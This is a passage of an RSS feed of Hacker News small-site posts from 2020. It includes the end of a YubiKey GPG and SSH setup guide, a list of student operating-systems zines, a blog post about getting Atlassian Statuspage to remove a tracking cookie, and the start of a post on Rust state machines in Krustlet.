choose "1" Curve 25519</code></pre><p>Set expiration, and choose yes to create, and then yes again to really create it..... these gpg tools are not very user friendly are they?</p><p>Okay! We did it... we created the keys and just need to type <code>save</code> to get out of the gpg tool. We can finally move on.</p><h2 id="exporting-the-key">Exporting the Key</h2><p>Inside your <code>gpg</code> folder, run the following:</p><pre><code>gpg --armor --export-secret-keys $(cat keyid) &gt; mastersub.key
gpg --armor --export-secret-subkeys $(cat keyid) &gt; sub.key
gpg --armor --export $(cat keyid) &gt; public.key</code></pre><p>We've successfully exported our key, and the corresponding gpg public key. This will be needed later when we setup commit signing. </p><p>THIS IS VERY IMPORTANT</p><p>be sure to make a zip file of your gpg folder that we ran the commands inside of. You should have the following files inside:</p><pre><code>keyid        
mastersub.key 
public.key    
sub.key</code></pre><p>This zip file (gpg.zip) should be backed up offline to a usb drive, or other secure location. It is also very important, because each time we move our gpg key over to a yubikey, the gpg tool destroys the key. So we have to copy over a duplicate each time. </p><p>Side note... this is yet another annoyance with the gpg tool. I am trying to make this guide as straight forward as I can, it took me forever to do all of this because of how overly complicated the gpg tools are. Thankfully some core contributors are <a href="https://sequoia-pgp.org/">rewriting the spec in rust</a>.</p><h2 id="setting-up-your-yubikey">Setting up your Yubikey</h2><p>We'll move on to getting our yubikey ready! We start by configuring it. GPG recognizes Yubikeys as smart cards:</p><pre><code>gpg --card-edit
admin
passwd</code></pre><p>On this prompt, you will want to choose <code>1</code> to change the pin. When the prompt comes up, type <code>123456</code> for the current pin, this is the default for yubikeys. After, set a secure password. This will be used to unlock the secret key on your Yubikey for ssh or gpg usage. I like to keep mine kind of short, but also something that isn't too easy.</p><p>After that, type <code>3</code>. This time we need to change the admin pin. The initial pin is <code>12345678</code>. I tend to use the same pin for admin and normal pins. I also use the same pin on each of my backup yubikeys, so that I don't accidentally get locked out. After that's done, type <code>q</code>, then there's a few extra commands you can set if you want to:</p><pre><code>name
lang
login</code></pre><p>Before we add the keys to our Yubikey, there are a couple optional setup steps. If you want to, you can go download <a href="https://developers.yubico.com/yubikey-manager/">Yubikey Manager CLI</a>. And run these commands:</p><pre><code>ykman openpgp set-touch aut off
ykman openpgp set-touch sig on
ykman openpgp set-touch enc on</code></pre><p>It's up to you to set these to on or off. This is just telling your yubikey that any authentication, signature, or encryption key usage, requires a physical touch of the device before it will do the operation. This can be useful for ultra security conscious individuals. A program wouldn't be able to sign or encrypt anything with your key in the background, because it would require a touch before any action.</p><p>The last thing I tend to do, is install up the <a href="https://developers.yubico.com/yubikey-manager-qt/">Yubikey Manager GUI</a>, go to Applications -&gt; OTP, and disabled the short touch action. This is on by default and if you bump it during a slack message, it can be really weird sending these authenticator codes by accident. </p><p>I like to configure the long touch action with a static password, I will choose something really random, but use it across all of my backup keys. If I am on a public computer without access to 1Password, I can use it as a secure password option, or you could even store your 1Password secret key here.</p><p>Oh, and before I forget, you can also go to Applications -&gt; FIDO2 and set a pin there. This will be used for <a href="https://webauthn.io/">Webauthn</a> when supported. If you use your Yubikey for 2FA on the web, it will require a pin, this protects you from someone stealing your yubikey and attempting to use it to access a service online, they would also need your pin. Also note that this is separate, and not the same as the GPG smart card pin we created earlier. All these specs in one device.... confusing huh?</p><p>There's so much these keys can do, and its spread across wayyyy too many applications and configurations!</p><h2 id="adding-to-a-yubikey">Adding to a Yubikey</h2><p>This section can be followed again for every Yubikey that you want to use. These will be exact clones with the master key on them, and will expose the same ssh public key every time you do this process.</p><p>You need to run the following commands outside of the <code>gpg</code> directory that we created in the key creation step. </p><p>Your current directory should have <code>gpg.zip</code> in it. Start by unarchiving the <code>gpg.zip</code> that we created earlier. Each time you do this section (for every key) you need to delete the <code>gpg</code> folder, and unarchive <code>gpg.zip</code> again. We can't reuse the <code>gpg</code> folder each time, because the gpg smart card commands delete the secret key, so you MUST have a fresh copy of the gpg files each time.</p><pre><code># unzip gpg.zip
export GNUPGHOME=$(mktemp -d)
cp -r gpg $GNUPGHOME
cd $GNUPGHOME/gpg

gpg --import mastersub.key
gpg --edit-key $(cat keyid)
</code></pre><p>Now we begin copying each of the three keys off the card. It's a bit verbose, so here's how you do it:</p><pre><code>key 1
keytocard (choose encryption, 1)
key 1


key 2
keytocard (signature)
key 2


key 3
keytocard (auth)
key 3
save</code></pre><p>GPG makes you select the key, then after doing <code>keytocard</code> you have to deselect it by typing the same thing again. It sometimes says "operation not supported by device" after you do the initial yubikey setup and run the <code>keytocard</code> command. Just unplug your yubikey, then plug it back in, type <code>keytocard</code> again, and it should show the key selection menu.</p><p>Each time you do <code>keytocard</code> you will have to enter the master key's secret key that you wrote down earlier, followed by the card's admin pin that you set. Like I said, pretty verbose, and can take a while if you have a really long secret key!</p><p>After this step is complete, your yubikey is ready to go.</p><h2 id="setting-up-gpg-signing">Setting up GPG Signing</h2><p>This process should be done on each computer that you want to do commit signing on.</p><pre><code>git config --global user.signingkey $(cat keyid)
git config --global commit.gpgsign true
gpg --import public.key</code></pre><p>The last command is the most important part. You must import the public key from your gpg master key, otherwise git won't recognize your yubikey. Don't ask how many hours I spent being confused as to why this didn't work on my second computer the first time :P &nbsp;</p><p>Be sure to add the contents of our <code>public.key</code> file to GitHub or other service, so that your commits will show as verified. </p><h2 id="using-ssh">Using SSH</h2><p>On a Mac you need to do the following:</p><pre><code>vi ~/.gnupg/gpg-agent.conf</code></pre><p>the contents are:</p><pre><code>use-st‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zach.codes/ultimate-yubikey-setup-guide/">https://zach.codes/ultimate-yubikey-setup-guide/</a></em></p>]]>
            </description>
            <link>https://zach.codes/ultimate-yubikey-setup-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583224</guid>
            <pubDate>Thu, 24 Sep 2020 20:29:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Operating systems zines made by CS students]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582973">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://nipunbatra.github.io/os2020/zine/ | <a href="https://web.archive.org/web/*/https://nipunbatra.github.io/os2020/zine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/booting.png" alt="">
    </p>
    <div>
      <h3><b>Booting</b></h3>
      <p>Arpit Patel &amp; Lovepreet Singh</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/booting.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1ecfxb93eQiO1A13lTeZ8tm6VHBX3zaaJ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CFS.png" alt="">
    </p>
    <div>
      <h3><b>Completely Fair Scheduler</b></h3>
      <p>Preet Patel &amp;  Ribhu Vajpeyi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CFS.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bNf4Bloj71m9fKkZoN5Ot1flXyvGUKgB/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Checksum.png" alt="">
    </p>
    <div>
      <h3><b>Checksum</b></h3>
      <p>Anupam Kumar &amp; Chiluveru Preeti</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Checksum.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/181N0FAGVofW3dBhQ6tQsuUcim0YpdtlW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/chmod.png" alt="">
    </p>
    <div>
      <h3><b>chmod</b></h3>
      <p>Pranshu Kumar Gond &amp; Sagar Bisen</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/chmod.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hPdjCsrAHTRImBf1kV4ACBW6W7_d-LQW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CODEC.png" alt="">
    </p>
    <div>
      <h3><b>CODEC</b></h3>
      <p>Utsav Jethva	&amp; Shweta Pardeshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CODEC.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hONumvnnPV0CgGxVfA_hHYALUTYW3z5M/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CRON.png" alt="">
    </p>
    <div>
      <h3><b>CRON</b></h3>
      <p>Chandrahas	Rama &amp; Krishna Reddy</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CRON.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1Z2CStAdJYa24N7Y5RMUe96QC-qzS9PuQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/cross_compilation.png" alt="">
    </p>
    <div>
      <h3><b>Cross Compilation</b></h3>
      <p>Urvishkumar Patel &amp; Tanmaey Gupta</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/cross_compilation.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bp6xTXdZ2ij53xyr7stgi6vtDwi9SKBE/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Curl.png" alt="">
    </p>
    <div>
      <h3><b>Curl</b></h3>
      <p>Akshay Biju &amp; Avinash Karanam</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Curl.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dUGubQh7Yicwlvc0egKprEb6mLeCjPFg/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/DD.png" alt="">
    </p>
    <div>
      <h3><b>Data Duplicator</b></h3>
      <p>Dhanya Sree &amp;  Manisha</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/DD.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/12Z3TS4XU4XJzAHtQN0UkEPN2pp0EMgJi/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Docker.png" alt="">
    </p>
    <div>
      <h3><b>Docker</b></h3>
      <p>Shivam Sahni &amp;  Dishank Goel</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Docker.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dEj3UBFZgRYY0sjoV1cTKbJeVYtuivsS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Dotfiles.png" alt="">
    </p>
    <div>
      <h3><b>Dotfiles</b></h3>
      <p>G Harshavardhan &amp;  Pittala Nikhil</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Dotfiles.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1f59tv18sSqNwara8oo2YVoT_3II4Ww5l/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.png" alt="">
    </p>
    <div>
      <h3><b>Environment Variable</b></h3>
      <p>Prasad Athave &amp;  Siddharth Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1iKiV5BTdzG7UKPnsVfD-c3utEig3KHgc/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/gdb.png" alt="">
    </p>
    <div>
      <h3><b>gdb</b></h3>
      <p>Dhruvi Lodhavia &amp;  Udit Vyas</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/gdb.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1APC_H_ogNgClvDlawFrSObP4dcSm_5Kf/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GREP.png" alt="">
    </p>
    <div>
      <h3><b>GREP</b></h3>
      <p>Priyam Tongia &amp;  Mihir Jain</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GREP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jgOq0CNteDyv9UwqmatrgtFyMzLfnKoY/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GZIP.png" alt="">
    </p>
    <div>
      <h3><b>GZIP</b></h3>
      <p>Kalyan  &amp;  Shahid</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GZIP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1uJ78nyH_btQ4q5DU9bFLjOADJPrFLj-9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.png" alt="">
    </p>
    <div>
      <h3><b>Make File</b></h3>
      <p>Kushagra Sharma  &amp;  Aditya Tripathi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1lHeeE7Ib0-2riTf3Y1m_zwtMkUDSQBwu/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/man.png" alt="">
    </p>
    <div>
      <h3><b>Man</b></h3>
      <p>Vedant Bhutani &amp;  Ojas Mithbavkar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/man.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1oY0gE0SyTdnBQ33XUhRqXk9Qow3K3h_9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Mount.png" alt="">
    </p>
    <div>
      <h3><b>Mount</b></h3>
      <p>Abhavya Chandra &amp;  Shubham Deshpande</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Mount.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/17qzY44lbL0CmD69Po7HnM1bFXUkvRAx-/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Nohup.png" alt="">
    </p>
    <div>
      <h3><b>Nohup</b></h3>
      <p>Aditya Pusalkar &amp;  Pushkar Mujumdar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Nohup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1BsOSQwzfo4Y-oqocBOPz1v5UT89wpSkH/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/nslookup.png" alt="">
    </p>
    <div>
      <h3><b>nslookup</b></h3>
      <p>Ajinkya Pawar &amp;  Jitender Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/nslookup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/19JlHAFJGVz515C6WyGOufZ0tQB_Kf1JU/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/OS_Python.png" alt="">
    </p>
    <div>
      <h3><b>OS Python</b></h3>
      <p>Amey Kulkarni &amp;  Chris Francis</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/OS_Python.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1gHbMbr064SxUK1aOY0k0MSjXrRrYLmRS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/peggit.png" alt="">
    </p>
    <div>
      <h3><b>Peggit</b></h3>
      <p>Janvi Thakkar &amp;  Aishna Agrawal</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/peggit.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jv3JHauQ-NFFxL1-z77bsg4bd9Ef_e14/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ping.png" alt="">
    </p>
    <div>
      <h3><b>Ping</b></h3>
      <p>Raghav Goyal &amp;  Devvrat Joshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ping.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1KTo_GnLo5Lk33j1vJRp99niGuG1dJsQv/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/pipe.png" alt="">
    </p>
    <div>
      <h3><b>Pipes</b></h3>
      <p>Harsh Shah &amp;  Madhav Tiwari</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/pipe.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SED.png" alt="">
    </p>
    <div>
      <h3><b>SED</b></h3>
      <p>Ronak Kaoshik &amp;  Deepika Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SED.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1wLoi0Fw0P2eN9pCjeGKjLOcQtNmfrGmI/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SFTP.png" alt="">
    </p>
    <div>
      <h3><b>SFTP</b></h3>
      <p>Viraj Shah &amp;  Vrutik Shah</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SFTP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1_vuoQw64f8qxhGwfkJhPRIL6FM9PFvX_/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.png" alt="">
    </p>
    <div>
      <h3><b>Sort and Uniq</b></h3>
      <p>Nishikant Parmar &amp;  Sachin Yadav</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1u_4qVfko5kEyhPOBp8iNWaVbtncoPhTO/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSDS.png" alt="">
    </p>
    <div>
      <h3><b>SSDS</b></h3>
      <p>Varun Jain &amp;  Arpita Kabra</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSDS.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSH.png" alt="">
    </p>
    <div>
      <h3><b>SSH</b></h3>
      <p>Harsh Patel &amp;  Palak Purohit</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSH.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1V1ou72qCVmTSSOmDJTJEPcyyLSF7F_2g/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/tar.png" alt="">
    </p>
    <div>
      <h3><b>Tar</b></h3>
      <p>Vivek Modi  &amp;  Shruti Katpara</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/tar.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1x-Mgglk0W2Xz3-NSwpEt74iZMGM045qh/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Traceroute.png" alt="">
    </p>
    <div>
      <h3><b>Traceroute</b></h3>
      <p>Rwik Rana &amp;  Harshit Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Traceroute.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/11mPNAKAXZHaBM_UoznSEZcW6TVH_osOl/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Valgrind.png" alt="">
    </p>
    <div>
      <h3><b>Valgrind</b></h3>
      <p>Abhinav Singh &amp;  Bikramjot Singh Dhindsa</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Valgrind.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1HpXGbFqlU-w7o6WIjGNB1MT0W6jC1WY5/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/VIM.png" alt="">
    </p>
    <div>
      <h3><b>VIM</b></h3>
      <p>Shril mody &amp;  hetvi shastri</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/VIM.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1sot_LDAZBRTTdtZHbKBNJxWmJQ8B0RlQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>

  </article></div>]]>
            </description>
            <link>https://nipunbatra.github.io/os2020/zine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582973</guid>
            <pubDate>Thu, 24 Sep 2020 20:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Tracking Cookies on Status.healthchecks.io]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582911">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/ | <a href="https://web.archive.org/web/*/https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-671" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p><a href="https://status.healthchecks.io/">status.healthchecks.io</a> used to set an ‚Äúajs_anonymous_id‚Äù tracking cookie. I‚Äôm happy to report that it does not do that anymore since September 22, 2020. In this post, I‚Äôll share the process I went through to get the tracking cookie removed.</p>
<p>For powering status.healthchecks.io, I am using a third-party hosted status page provider, Statuspage.io, by Atlassian. I initially set it up in May 2020 and <a href="https://blog.healthchecks.io/2020/05/healthchecks-io-status-page-facelift/">wrote about it on this blog</a>. After the setup, while poking around, I discovered my fancy new status page sets a tracking cookie. It does not ask for the user‚Äôs consent, and it does not obey the ‚ÄúDNT‚Äù header ‚Äì when you visit the page, you get a tracking cookie.&nbsp;</p>
<p>I believe this cookie was only used for innocuous purposes (tracking the number of unique page visitors), but it still invades site visitors‚Äô privacy and violates GDPR requirements. On May 7, I submitted a support ticket asking to remove the tracking cookie and got a reply with a bottom line: ‚ÄúWe can‚Äôt avoid setting these cookies.‚Äù After asking again, I got back a non-commital ‚ÄúI will forward this to our product team and development team,‚Äù and that was that.&nbsp;</p>
<p>I had already invested a significant amount of time setting up automation and custom metrics for the status page. And, aside from the cookie issue, I was generally happy with the product. Before switching providers over this one issue, I wanted to take a crack at fixing it. It was unlikely Atlassian would spend any engineering resources just because a single $29/mo customer had complaints. So I needed to bump up the priority of the issue. I searched around for other Statuspage.io customers and started contacting them. My email template went through several iterations until I got to a version that felt transparent and not manipulative:</p>

<blockquote><p>Subject: Cookies on status.somedomain.com<br>Hello,</p><p>when I visit status.somedomain.com I see it stores the following cookies in my browser:</p><p>* ajs_anonymous_id<br>* ajs_group_id</p><p>These are Atlassian‚Äôs tracking cookies. They are not essential, and so under GDPR they require the user‚Äôs explicit opt-in before they can be sent to the browser.</p><p>I am an Atlassian Statuspage customer myself, and my service‚Äôs status page has the exact same problem. I‚Äôve contacted Atlassian about this but this appears to be low priority for them.</p><p>I am contacting you because I think more affected customers being aware of the issue and asking Atlassian to fix it = higher chance that they will actually do something.</p><p>Thanks,<br>Pƒìteris Caune</p></blockquote>
<p>I started by manually sending ten or so emails out every week. I mostly got sympathetic and cooperative responses. There were some funny ones too. For example, one guy insisted that there is no problem because he could not reproduce the issue using ‚Äúinternal methods.‚Äù Me showing him the results of several different cookie scanning services (<a href="https://cookie-script.com/">cookie-script.com</a>, <a href="https://www.cookiebot.com/en/">cookiebot.com</a>) did not sway him.</p>
<p>I kept contacting other companies, and they sometimes forwarded me the responses they were getting from Atlassian. From these responses, it didn‚Äôt look like we were making much progress. In July, two months in, I decided to amp things up. I grabbed the <a href="https://majestic.com/reports/majestic-million">Majestic Million</a> dataset with the top million websites. I wrote a script that goes through the list, and, for each website, checks if it has an Atlassian-operated ‚Äústatus‚Äù subdomain. The script produced an HTML page with filtered results and ‚Äúmailto:‚Äù links, to help me send out the emails. Side note: did you know the ‚Äúmailto:‚Äù links <a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks#Specifying_details">can specify the message body</a>?</p>
<p>To find email addresses, I found the best way was to look at each website‚Äôs privacy policy and search for the ‚Äú@‚Äù symbol. I found typical contact addresses were <strong>privacy</strong>@somedomain.com and <strong>dpo</strong>@somedomain.com (where ‚Äúdpo‚Äù stands for Data Protection Officer). On July 26-27, one by one, I sent out emails to around 200 companies.</p>
<p>The wave of new support tickets from various companies worked. Atlassian started communicating back a plan to implement a cookie consent banner in Q1 2021. Later in August, they started saying ‚Äúlate September 2020‚Äù. I held off from sending more emails and waited to see what would happen in September.</p>
<p>On September 22, I received an update from Atlassian. Instead of implementing a cookie consent banner, they decided to drop the Page Analytics feature, which was responsible for the tracking cookie.&nbsp;From my point of view, this is the best possible outcome ‚Äì no tracking cookie and no consent banner. Statuspage.io still has an option of adding a Google Analytics tag. So, there still is&nbsp;<em>a way</em>&nbsp;to track the unique visits for those who need it.&nbsp;</p>
<p>Thank you, Atlassian / Statuspage.io, for implementing this change. I appreciate it! To my contact at Atlassian support, thank you for your patience.&nbsp;</p>
<p>To everyone who also contacted Atlassian about the tracking cookies, thank you! It took a team effort, but it worked out in the end!</p>
<p>‚Äì Pƒìteris</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582911</guid>
            <pubDate>Thu, 24 Sep 2020 19:59:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Fistful of States: More State Machine Patterns in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582900">thread link</a>) | @shred45
<br/>
September 24, 2020 | https://deislabs.io/posts/a-fistful-of-states/ | <a href="https://web.archive.org/web/*/https://deislabs.io/posts/a-fistful-of-states/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Earlier this year, DeisLabs released Krustlet, a project to implement Kubelet
in Rust. <sup id="fnref:Fisher"><a href="#fn:Fisher">1</a></sup> <sup id="fnref:Squillace"><a href="#fn:Squillace">2</a></sup> Kubelet is the component of Kubernetes that
runs on each node which is assigned Pods by the control plane and runs them on
its node. Krustlet defines a flexible API in the <code>kubelet</code> crate, which allows
developers to build Kubelets to run new types of workloads. The project
includes two such examples, which can run Web Assembly workloads on WASI or
waSCC runtimes. <sup id="fnref:wasmtime"><a href="#fn:wasmtime">3</a></sup> <sup id="fnref:waSCC"><a href="#fn:waSCC">4</a></sup> Beyond this, I have been working to
develop a Rust Kubelet for traditional Linux containers using the Container
Runtime Interface (CRI). <sup id="fnref:krustlet-cri"><a href="#fn:krustlet-cri">5</a></sup> <sup id="fnref:CRI"><a href="#fn:CRI">6</a></sup></p>

<p>Over the last few releases, Krustlet has focused on expanding the functionality
of these Web Assembly Kubelets, such as adding support for init containers,
fixing small bugs, and log streaming. This, in turn, has built quite a bit of
interest in alternative workloads and node architectures on Kubernetes, as well
as demonstrated the many strengths of Rust for development of these types of
applications.</p>

<p>For the <code>v0.5.0</code> release, we turned our attention to the internal architecture
of Krustlet, in particular how Pods move through their lifecycle, how
developers write this logic, and how updates to the Kubernetes control plane
are handled. <sup id="fnref:Pod-Lifecycle"><a href="#fn:Pod-Lifecycle">7</a></sup> We settled upon a state machine implementation
which should result in fewer bugs and greater fault tolerance. This refactoring
resulted in substantial changes for consumers of our API; however we believe
this will result in code that is much easier to reason about and maintain. For
an excellent summary of these changes, and description of how you can migrate
code that depends on the <code>kubelet</code> crate, please see Taylor Thomas‚Äô excellent
<a href="https://github.com/deislabs/krustlet/releases/tag/v0.5.0">Release Notes</a>.
In this post I will share a deep dive into our new architecture and the
development journey which led to it.</p>

<h2 id="the-trailhead">The Trailhead</h2>

<p>Before <code>v0.5.0</code>, developers wishing to implement a Kubelet using Krustlet
primarily needed to implement the <code>Provider</code> trait, which allowed them to write
methods for handling events like <code>add</code>, <code>delete</code>, and <code>logs</code> for Pods scheduled
to that node. This offered a lot of flexibility, but was a very low-level API.
We identified a number of issues with this architecture:</p>

<ul>
<li>The entire lifecycle of a Pod was defined in 1 or 2 monolithic methods of the
<code>Provider</code> trait. This resulted in messy code and a very poor understanding
of error handling in the many phases of a Pod‚Äôs lifecycle.</li>
<li>Pod and Container status patches to the Kubernetes control plane were
scattered throughout the codebase, both in the <code>kubelet</code> crate and the
<code>Provider</code> implementations. This made it very difficult to reason about what
was actually reported back to the user and when, and involved lot of repeated
code.</li>
<li>Unlike the Go Kubelet, if Krustlet encountered an error it would report the
error back to Kubernetes and then (most of the time) end execution of the
Pod. There was no built-in notion of the reconciliation loop that one expects
from Kubernetes.</li>
<li>We recognized that a lot of these issues were left to each developer to
solve, but were things that any Kubelet would need to handle. We wanted to
move this kind of logic into the <code>kubelet</code> crate, so that each provider did
not have to reinvent things.</li>
</ul>

<h2 id="our-mission">Our Mission</h2>

